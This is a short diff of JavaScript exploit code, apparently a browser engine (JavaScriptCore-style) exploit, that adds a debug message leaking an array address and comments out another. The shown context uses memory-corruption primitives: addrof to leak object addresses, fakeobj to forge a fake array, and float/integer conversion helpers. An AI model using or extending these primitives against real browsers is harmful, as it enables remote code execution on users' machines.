@@ -498,6 +498,7 @@ var VM_PROT_EXECUTE = 0x4
             };
             let addr = addrof(obj);
             port.postMessage("obj @ " + addr.toString());
+            port.postMessage("arr @ " + addrof([]).toString());
             port.postMessage(typeof(addr) +"vs"+typeof(0x10))
            
             let fakeArr = fakeobj(Add(addr,new Int64(0x10))); //no way around this im forced to use bigint for fakeobj :(
@@ -525,7 +526,7 @@ var VM_PROT_EXECUTE = 0x4
               b1[0] = val;
               return new Int64.fromDouble(a1[0]);
             }
-            port.postMessage("obj addr@ " + addrof(""))
+            //port.postMessage("obj addr@ " + addrof(""))
               //gc();
             /*var rw = {
                 fake: function(addr) {
